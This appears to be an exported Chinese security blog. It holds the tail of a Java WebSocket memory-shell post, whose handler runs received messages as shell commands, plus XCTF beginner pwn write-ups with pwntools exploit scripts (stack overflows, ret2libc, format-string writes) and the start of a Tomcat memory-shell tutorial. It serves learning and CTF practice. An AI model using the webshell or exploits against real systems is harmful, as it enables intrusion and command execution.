class=\"title\">String</span>&gt; </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onMessage</span><span class=\"params\">(String message)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">boolean</span> iswin = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().startsWith(<span class=\"string\">&quot;windows&quot;</span>);</span><br><span class=\"line\">                Process exec;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (iswin) &#123;</span><br><span class=\"line\">                    exec = Runtime.getRuntime().exec(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, message&#125;);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    exec = Runtime.getRuntime().exec(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/bash&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, message&#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                InputStream ips = exec.getInputStream();</span><br><span class=\"line\">                StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">                <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">                <span class=\"keyword\">while</span>((i = ips.read()) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                    sb.append((<span class=\"keyword\">char</span>)i);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                ips.close();</span><br><span class=\"line\">                exec.waitFor();</span><br><span class=\"line\">                session.getBasicRemote().sendText(sb.toString());</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可搭配 JNDI注入、反序列化等注入内存</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220722015033708.png\" alt=\"image-20220722015033708\"></p>\n<h1 id=\"检测\"><a href=\"#检测\" class=\"headerlink\" title=\"检测\"></a>检测</h1><p><a href=\"https://mp.weixin.qq.com/s/T3UfA1plrlG-e9lgfB4whg\">https://mp.weixin.qq.com/s/T3UfA1plrlG-e9lgfB4whg</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/339361.html\">https://www.freebuf.com/articles/web/339361.html</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.csdn.net/m0_37356874/article/details/108055621\">Websocket的使用(javax.websocket版本)</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_36586120/article/details/120025498\">WebSocket通信原理和在Tomcat中实现源码详解</a></p>\n<p><a href=\"https://www.cnblogs.com/duanxz/p/5041110.html\">https://www.cnblogs.com/duanxz/p/5041110.html</a></p>\n<p><a href=\"https://bbs.huaweicloud.com/blogs/351314\">https://bbs.huaweicloud.com/blogs/351314</a></p>\n","categories":["JavaSec"]},{"title":"关于函数调用 栈在内存中从高地址向低地址生长","url":"/2023/12/25/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E4%BB%8E%E9%AB%98%E5%9C%B0%E5%9D%80%E5%90%91%E4%BD%8E%E5%9C%B0%E5%9D%80%E7%94%9F%E9%95%BF/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>看到这样一段话 , 不理解，搜了一下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/91d527fa94ae45558e26b3dc8ffec61c.png\"></p>\n<a id=\"more\"></a>\n<h1 id=\"栈\"><a href=\"#栈\" class=\"headerlink\" title=\"栈\"></a>栈</h1><p>首先，我觉得有必要深入理解一下 <code>栈</code> </p>\n<p><a href=\"https://www.zhihu.com/question/49861533\">一个有关于栈的问题？</a></p>\n<p>初学时，有这种死板的印象 栈就是像盖房子一样，入栈时从底部向上，出栈时就像拆房子从上向下拆</p>\n<p>那么栈的定义是什么?</p>\n<blockquote>\n<p>借用：<br>栈是一种数据结构，有2种操作：加入一个元素，删除最迟加入（且没被删除，还在栈里）的元素。<br>没了，这就是栈的定义</p>\n</blockquote>\n<p>那么上面我说的盖房子就仅仅是对 <code>栈</code> 这种<code>抽象</code>的一种具体实现，无非就是满足了他的功能</p>\n<p>我也可以这样盖房子：从天上开始盖，但是拆房子时<code>必须</code>从下面拆(抽象)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/08ea00e686bd4a0883e6143e4e902038.png\"></p>\n<h1 id=\"栈地址从高到低生长，堆从低到高\"><a href=\"#栈地址从高到低生长，堆从低到高\" class=\"headerlink\" title=\"栈地址从高到低生长，堆从低到高\"></a>栈地址从高到低生长，堆从低到高</h1><p><a href=\"https://www.zhihu.com/question/28483772\">计算机中的堆地址从低到高向上增长，但栈地址却从高到低向下增长，为什么这样设计，这样设计有什么好处？</a></p>\n<p>借用两张图</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/e891624c770247a5bff4ec5dc4ab4f65.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/28f4eed2cc3744a1aeb7324cc4c18505.png\"><br>如果栈向上涨的话，我们就必须得指定栈和堆的一个严格分界线，那么就可能出现栈溢出，导致程序崩溃，并且浪费大量闲置的堆空间，所以呢，最好的办法就是让堆和栈一个向上涨，一个向下涨，<code>这样它们就可以最大程度地共用这块剩余的地址空间，达到利用率的最大化</code></p>\n","categories":["二进制"]},{"title":"攻防世界 pwn 新手","url":"/2023/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20pwn/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>攻防世界 pwn 入门</p>\n<h1 id=\"hello-pwn\"><a href=\"#hello-pwn\" class=\"headerlink\" title=\"hello pwn\"></a>hello pwn</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/81851c1fd5e14350b4a113a9fcc91149.png\"></p>\n<p>64位程序 read函数读取0x10到地址601068然后与地址60106c进行比较</p>\n<a id=\"more\"></a>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/0359931590944ebf95d1769ee0c70a42.png\"></p>\n<p>因为这两个地址相差4，但是可以读取10</p>\n<p>poc:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">r &#x3D; remote(&#39;111.200.241.244&#39;,50691)</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*4 + p64(1853186401)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"level0\"><a href=\"#level0\" class=\"headerlink\" title=\"level0\"></a>level0</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/27199c60b76c4bcc96b4426b2108d9ae.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/37608bd2160c4f8ca3e0fdf4bf9ed645.png\"></p>\n<p>但是只发现了在函数列表中存在一个callsystem函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/376ade5d0dc742bdbb44b784bc74567a.png\"></p>\n<p>那么可以先填充80个字节，然后，将rip填充为callsystem()的地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/fbde8e34d7bf4459bb6fe1aec178cf08.png\"></p>\n<p>call, 执行函数调用. 当 CPU 执行 call 指令时, 首先会把 rip 寄存器的值入栈, 然后设置 rip 值为目标地址, 由于 rip 寄存 器的值决定了下一条CPU需要执行指令的位置, 所以当 CPU 执行完成当前 call 指令后就会跳转到目标地址.</p>\n<p>因此可以借助vulnerable_function()的read函数，将缓冲区填充满，再将<code>ebp+0x8即eip所在的地址覆盖为callsystem函数地址</code>，即可得到shell。</p>\n<p>poc:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">r &#x3D; remote(&#39;111.200.241.244&#39;,60861)</span><br><span class=\"line\">#r &#x3D; process(&#39;.&#x2F;level0&#39;)</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*0x80+&#39;a&#39;*0x8 + p64(0x00400596)</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Level2\"><a href=\"#Level2\" class=\"headerlink\" title=\"Level2\"></a>Level2</h1><p>32位程序</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/902cc37738de4ffcb45fe4139dccd7af.png\"><br>Read存在溢出，buf这个字符数组的长度只有0x88，却可以输入0x100的东西，能覆盖掉数组外面的东西。当属于数组的空间结束后，有一个4个字节长度的s，其次是一个存放着返回地址的r。我们可以输入数据，覆盖返回地址r。</p>\n<p>没有什么危险，也没有像level0一样，有后门函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/45ef7ff4a1cd47a1b01cec5643a29af6.png\"><br>在 .plt段 发现_system函数且在 数据段 发现/bin/bash地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/83db82ec2748406891092a88a02c51ca.png\"><br>根据32位程序栈结构：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/43e934f49fea4bf8afdad2ab6c377bae.png\"><br>poc:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">r &#x3D; remote(&#39;111.200.241.244&#39;,60254)</span><br><span class=\"line\">#r &#x3D; process(&#39;.&#x2F;level2&#39;)</span><br><span class=\"line\">bash_add &#x3D; 0x0804a024</span><br><span class=\"line\">sys_add &#x3D; 0x08048320</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*0x88+&#39;a&#39;*0x4 + p32(sys_add)+p32(0)+p32(bash_add)</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>p32(0)是为了填充函数返回地址，随便返回到哪都行</p>\n<h1 id=\"guess-num\"><a href=\"#guess-num\" class=\"headerlink\" title=\"guess_num\"></a>guess_num</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/3cbefaed83b547eeafbdc3c93c9f4d0c.png\"><br>Gets栈溢出覆盖seed的值 使其为伪随机数</p>\n<p>poc：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">r &#x3D; remote(&quot;111.200.241.244&quot;,63805)</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; b&#39;a&#39; * (0x30-0x10) + p64(0).decode(&#39;unicode_escape&#39;)</span><br><span class=\"line\">r.sendlineafter(&quot;Your name:&quot;,payload)</span><br><span class=\"line\">l &#x3D; [&#39;2&#39;,&#39;5&#39;,&#39;4&#39;,&#39;2&#39;,&#39;6&#39;,&#39;2&#39;,&#39;5&#39;,&#39;1&#39;,&#39;4&#39;,&#39;2&#39;]</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(10):</span><br><span class=\"line\">    r.sendlineafter(&quot;Please input your guess number:&quot;,l[i])</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"int-overflow\"><a href=\"#int-overflow\" class=\"headerlink\" title=\"int_overflow\"></a>int_overflow</h1><p>整数溢出</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/6d53a7536683402b9fc60a37832074b6.png\"><br>无符号整数类型的v3 存入到al 8位寄存器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/ce1ce8d947e349b6b6adcaef4c3c245c.png\"></p>\n<p>可利用函数且有地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/2720281457b64f2480c959564dc56f0c.png\"></p>\n<p>那么整数的范围就是0-255(00000000–11111111)</p>\n<p><code>如果超过这个范围那么就会进行模运算比如 输入257  那么结果就是 257%255=2</code></p>\n<p>可以看到有一个前提条件就是我们输入的长度必须是,(4,8]才能进入到else 那么输入的长度就应该是(259,263]</p>\n<p>通过strcpy来让dest溢出，覆盖返回地址到what_is_this()</p>\n<p>那么<code>payload = &#39;a&#39;*(0x14+4)+p32(flag).decode(&#39;iso-8859-1&#39;)+&#39;a&#39;*232</code></p>\n<p>poc:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">r &#x3D; remote(&quot;111.200.241.244&quot;,51588)</span><br><span class=\"line\"></span><br><span class=\"line\">flag &#x3D; 0x0804868B</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*(0x14+4)+p32(flag).decode(&#39;iso-8859-1&#39;)+&#39;a&#39;*232</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(&quot;Your choice:&quot;,&#39;1&#39;)</span><br><span class=\"line\"> </span><br><span class=\"line\">r.sendlineafter(&quot;input your username:&quot;,&quot;test&quot;)</span><br><span class=\"line\"> </span><br><span class=\"line\">r.sendlineafter(&quot;input your passwd:&quot;,payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"cgpwn2\"><a href=\"#cgpwn2\" class=\"headerlink\" title=\"cgpwn2\"></a>cgpwn2</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/3a59c25e5f6a4b7da6c337fc9d842605.png\"></p>\n<p>Fgets传入/bin/sh<br>Gets栈溢出跳到system</p>\n<p>poc:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">r &#x3D; remote(&quot;111.200.241.244&quot;,51213)</span><br><span class=\"line\">shell &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class=\"line\">name &#x3D; 0x0804A080</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*(0x26+4)+p32(0x08048420).decode(&#39;unicode_escape&#39;)+&#39;a&#39;*4+p32(name).decode(&#39;unicode_escape&#39;)</span><br><span class=\"line\">r.sendlineafter(&quot;please tell me your name&quot;,shell)</span><br><span class=\"line\">r.sendlineafter(&quot;hello,you can leave some message here:&quot;,payload)</span><br><span class=\"line\">r.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>构造payload的时候注意这是32位程序，而32位程序调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</p>\n<h1 id=\"level3\"><a href=\"#level3\" class=\"headerlink\" title=\"level3\"></a>level3</h1><p>参考：<br><a href=\"https://www.cnblogs.com/yuren123/p/12735145.html\">攻防世界PWN题 level3 - 愚人呀 - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://bbs.pediy.com/thread-254858.htm\">[原创]XCTF攻防世界 level3-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/a5fafe809673499fb4ed24448e3e9a68.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/8600202ec16448c08d3fe51cc078c2fb.png\"></p>\n<p>Buf定义0x88但是可以输入0x100</p>\n<p>但是没有像上面题目存在system函数和/bin/sh的字符串，但是write函数是载入了外部的运行库</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/869ae7f8af6b4f4aa8da43a4ec0fc8a3.png\"></p>\n<p>那就通过write函数打印出泄露的write函数在got中的地址 然后通过.so文件找出write在libc_32.so.6中的地址 接着就可以计算出libc基地址了。</p>\n<p>poc:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">#r &#x3D; process(&#39;.&#x2F;level3&#39;)</span><br><span class=\"line\">r &#x3D; remote(&#39;111.200.241.244&#39;,56507)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;level3&quot;)</span><br><span class=\"line\">write_plt &#x3D; elf.plt[&quot;write&quot;]</span><br><span class=\"line\">write_got &#x3D; elf.got[&quot;write&quot;]</span><br><span class=\"line\">main &#x3D; elf.symbols[&quot;main&quot;]</span><br><span class=\"line\"></span><br><span class=\"line\">libc &#x3D; ELF(&quot;.&#x2F;libc_32.so.6&quot;)</span><br><span class=\"line\">write_libc &#x3D; libc.symbols[&quot;write&quot;]</span><br><span class=\"line\">sys_libc &#x3D; libc.symbols[&quot;system&quot;]</span><br><span class=\"line\">binsh_libc &#x3D; libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 &#x3D; b&#39;a&#39;*0x88+b&#39;a&#39;*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class=\"line\">r.sendlineafter(&#39;Input:\\n&#39;,payload1)</span><br><span class=\"line\">write_addr &#x3D; u32(r.recv()[:4])</span><br><span class=\"line\"></span><br><span class=\"line\">sysaddr &#x3D; write_addr - write_libc + sys_libc</span><br><span class=\"line\">binshaddr &#x3D; write_addr - write_libc + binsh_libc</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 &#x3D; b&#39;a&#39;*0x88+b&#39;a&#39;*0x4+p32(sysaddr)+p32(0)+p32(binshaddr)</span><br><span class=\"line\">r.sendlineafter(&#39;Input:\\n&#39;,payload2)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>payload1中：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">b&#39;a&#39;*0x88+b&#39;a&#39;*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">填充+ebp+返回到write函数+二次攻击从main开始+参数1+参数write_got+参数4字节</span><br></pre></td></tr></table></figure>\n\n<p>那么为啥要传个write_got呢？</p>\n<p>我理解是现在的write_got<code>存放的是这个程序运行时write函数的地址</code>，如下图</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/293236a289cc492d8ae2b4add2495399.png\"><br>那么正好就打印了write函数地址造成泄露，<code>又因为库函数中字符串常量和函数之间的相对位置也是确定的</code>，所以可以找到当前system函数的真实地址并利用</p>\n<h1 id=\"CGfsb\"><a href=\"#CGfsb\" class=\"headerlink\" title=\"CGfsb\"></a>CGfsb</h1><p>参考：<a href=\"https://niceseven.github.io/post/2020/02/06/xctf-pwn-cgfsb/\">XCTF Pwn CGfsb | NiceSeven’s Website</a></p>\n<p>格式化字符串漏洞的简单利用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/b531fb158c29479d980aa8be0fb3b62d.png\"></p>\n<p>printf函数的格式化字符串常见的有<code> %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等</code>。</p>\n<p>但是有个不常见的格式化字符串 <code>%n</code> ，它的功能是<code>将%n之前打印出来的字符个数，赋值给一个变量</code>。</p>\n<p>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>\n<p><code>变量pwnme</code>的位置在bss段，地址为<code>0x0804a068</code></p>\n<p>bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域，bss段属于静态内存分配，地址不变</p>\n<p>确定偏移：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/98a3f38bd8e74642b9211db54c118788.png\"></p>\n<p>为10</p>\n<p>把pwnme的地址输进去，偏移10 将8利用 %n带入到pwnme的地址，所以变量pwnme就是8了</p>\n<p>poc:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">r &#x3D; remote(&#39;111.200.241.244&#39;,50887)</span><br><span class=\"line\"></span><br><span class=\"line\">pwnme &#x3D; 0x0804a068</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; p32(pwnme)+b&#39;a&#39;*4+b&#39;%10$n&#39;</span><br><span class=\"line\">r.sendlineafter(&#39;please tell me your name:&#39;,&#39;aaa&#39;)</span><br><span class=\"line\">r.sendlineafter(&#39;leave your message please:&#39;,payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n","categories":["二进制"]},{"title":"JAVA内存马","url":"/2023/12/25/%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2F6193d09c503d8e057afa1636_Java%20code%20review%20checklist-min-p-1600.jpeg\" alt=\"6193d09c503d8e057afa1636_Java code review checklist-min-p-1600\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>环境：Tomcat8.5.73 + jdk1.8</p>\n<h1 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h1><h2 id=\"java-web三大组件\"><a href=\"#java-web三大组件\" class=\"headerlink\" title=\"java web三大组件\"></a>java web三大组件</h2><ul>\n<li>Servlet</li>\n<li>Filter</li>\n<li>Listener</li>\n</ul>\n<p>处理请求时，处理顺序如下</p>\n<blockquote>\n<p>请求 → Listener → Filter → Servlet</p>\n</blockquote>\n<h2 id=\"Tomcat相关\"><a href=\"#Tomcat相关\" class=\"headerlink\" title=\"Tomcat相关\"></a>Tomcat相关</h2><p>搬运自Y4tacker大佬 <a href=\"https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat%E4%BB%8B%E7%BB%8D/Tomcat%E4%BB%8B%E7%BB%8D.md\">JavaSec/Tomcat介绍.md at main · Y4tacker/JavaSec (github.com)</a></p>\n<h3 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h3><p>Tomcat 作为Web服务器，实现了两个核心功能</p>\n<ul>\n<li><strong>Http 服务器功能：</strong>进行 Socket 通信(基于 TCP/IP)，解析 HTTP 报文</li>\n<li><strong>Servlet 容器功能：</strong>加载和管理 Servlet，由 Servlet 具体负责处理 Request 请求</li>\n</ul>\n<p>以上两个功能，分别对应着<strong>tomcat的两个核心组件连接器（Connector）和容器（Container）</strong>，连接器负责对外交流（完成 Http 服务器功能），容器负责内部处理（完成 Servlet 容器功能）</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220408095517957.png\" alt=\"image-20220408095517957\"></p>\n<ul>\n<li><strong>Server</strong> 代表整个 tomcat 服务器，一个 tomcat 只有一个 Server Server 中包含至少一个 Service 组件，用于提供具体服务。</li>\n<li><strong>Service</strong> 服务是 Server 内部的组件，一个Server可以包括多个Service。它将若干个 Connector 组件绑定到一个 Container</li>\n<li><strong>Connector</strong> 称为连接器，一个 Service 可以有多个 Connector，主要连接客户端请求,用于接受请求并将请求封装成 Request 和 Response，然后交给 Container 进 行处理，Container 处理完之后在交给 Connector 返回给客户端，接收不同的连接协议。</li>\n<li><strong>Container</strong> 称为容器，负责处理用户的 servlet 请求</li>\n</ul>\n<h3 id=\"Connector连接器\"><a href=\"#Connector连接器\" class=\"headerlink\" title=\"Connector连接器\"></a>Connector连接器</h3><p>连接器主要完成以下三个核心功能：</p>\n<ul>\n<li>socket 通信，也就是网络编程</li>\n<li>解析处理应用层协议，封装成一个 Request 对象</li>\n<li>将 Request 转换为 ServletRequest，将 Response 转换为 ServletResponse</li>\n</ul>\n<p>以上分别对应三个组件 EndPoint、Processor、Adapter 来完成。Endpoint 负责提供请求字节流给Processor，Processor 负责提供 Tomcat 定义的 Request 对象给 Adapter，Adapter 负责提供标准的 ServletRequest 对象给 Servlet 容器。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220408095636418.png\" alt=\"image-20220408095636418\"></p>\n<p>Endpoint与Processor有一个组合名称为ProtocolHandler</p>\n<h3 id=\"Container容器\"><a href=\"#Container容器\" class=\"headerlink\" title=\"Container容器\"></a>Container容器</h3><p>Container组件又称作Catalina，其是Tomcat的核心。在Container中，有4种容器，分别是Engine、Host、Context、Wrapper。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220408095812036.png\" alt=\"image-20220408095812036\"></p>\n<p>四种容器的作用：</p>\n<ul>\n<li>Engine 表示整个 Catalina 的 Servlet 引擎，用来管理多个虚拟站点，一个 Service 最多只能有一个 Engine，但是一个引擎可包含多个 Host。实现类为<code>org.apache.catalina.core.StandardEngine</code></li>\n<li>Host 代表一个虚拟主机，或者说一个站点，可以给 Tomcat 配置多个虚拟主机地址，而一个虚拟主机下可包含多个 Context。实现类为<code>org.apache.catalina.core.StandardHost</code></li>\n<li>Context 表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper。实现类为<code>org.apache.catalina.core.StandardContext</code></li>\n<li>Wrapper 表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等。实现类为<code>org.apache.catalina.core.StandardWrapper</code></li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220408095845813.png\" alt=\"image-20220408095845813\"></p>\n<h2 id=\"从HTTP请求到Servlet\"><a href=\"#从HTTP请求到Servlet\" class=\"headerlink\" title=\"从HTTP请求到Servlet\"></a>从HTTP请求到Servlet</h2><p>Tomcat使用<strong>Mapper组件</strong>来将用户请求的URL定位到某个Servlet。Mapper组件里保存了WEB应用的配置信息，也就是容器组件与访问路径的映射关系。比如Host容器里配置的域名、Context容器里的WEB应用路径以及Wrapper容器里Servlet映射的路径。</p>\n<p>Mapper组件通过解析请求URL里的域名和路径，再到自己保存的Map里去找，就能定位到一个Servlet。 最终一个请求URL只会定位到一个Wrapper容器，也就是一个Servlet 。</p>\n<h2 id=\"三种Context\"><a href=\"#三种Context\" class=\"headerlink\" title=\"三种Context\"></a>三种Context</h2><p>Tomcat中有如下三种Context: <strong>ServletContext、StandardContext、ApplicationContext</strong>。下面这张图很好的展现了这三个Context的结构。context实际上就是拥有当前中间件或框架处理请求、保存和控制servlet对象、保存和控制filter对象等功能的对象。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220409173327449.png\" alt=\"image-20220409173327449\"></p>\n<ul>\n<li><p>ServerletContext（是一个接口）</p>\n<p>通过 <strong>request.getServletContext()</strong> 获取到的是<strong>ApplicationContextFacade对象</strong>，它是对ServerletContext接口的实现类，该类提供了Web应用所有Servlet的视图，可以对某个Web应用的各种资源和功能进行访问。</p>\n<p>WEB容器在启动时，它会为每个Web应用程序都创建一个对应的ServletContext。<strong>它代表当前Web应用，并且它被所有客户端共享</strong>。</p>\n</li>\n<li><p>ApplicationContext</p>\n<p>ApplicationContext也是对ServerletContext接口的实现类，由上图可知该类被包装在<strong>ApplicationContextFacade</strong>类中。</p>\n</li>\n<li><p>StandardContext</p>\n<p>org.apache.catalina.Context接口的默认实现为<strong>StandardContext</strong>，而Context在Tomcat中代表一个web应用。ApplicationContext所实现的方法其实都是调用的StandardContext中的方法，<strong>StandardContext是Tomcat中真正起作用的Context</strong></p>\n</li>\n</ul>\n<h2 id=\"Tomcat中Context对象的获取\"><a href=\"#Tomcat中Context对象的获取\" class=\"headerlink\" title=\"Tomcat中Context对象的获取\"></a>Tomcat中Context对象的获取</h2><blockquote>\n<p>作为初学者，在借鉴文章时对这里进行思考可能利用的方式，对于为什么获取Context的对象，根据上面的图，可能是反射获取Context对象之后添加新的路由，编写对应的servlet，更改相关配置，然后到达目的</p>\n</blockquote>\n<p>对于Tomcat，一个Web应用中Context组件为<strong>org.apache.catalina.core.StandardContext的对象</strong>，在<strong>动态注册Servlet组件内存马</strong>时，<strong>获取StandContext对象成为关键点</strong>，通过哪种方式可以获取该对象，有以下几种方式</p>\n<h3 id=\"有request对象时\"><a href=\"#有request对象时\" class=\"headerlink\" 